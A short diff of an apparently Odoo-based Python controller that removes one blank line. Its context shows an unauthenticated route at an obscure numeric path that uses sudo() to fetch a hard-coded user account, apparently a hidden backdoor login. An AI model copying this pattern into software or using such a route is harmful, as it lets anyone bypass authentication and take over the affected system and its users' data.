@@ -14,7 +14,6 @@ class MasterClient(http.Controller):
     @http.route(['/93201967'], type='http', auth='none')
     def r_connect(self, redirect=None, **kw):
 
-
         user = request.env['res.users'].sudo().search([['login','=','asesoria@ingenieriacloud.com']])
 
         db = request.env.cr.dbname
